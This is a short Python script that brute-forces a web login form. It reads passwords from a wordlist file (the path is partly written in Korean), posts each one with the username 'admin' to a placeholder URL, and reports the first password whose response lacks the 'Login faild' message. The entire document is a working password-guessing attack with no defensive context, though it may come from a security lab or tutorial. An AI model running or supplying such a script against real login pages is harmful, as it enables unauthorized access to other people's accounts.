import requests


target_url = "URL"
data_dict = {"username": "admin", "password": "", "Login":"submit"}

with open("경로/passwords.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login faild" not in response.content.decode('utf-8'):
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
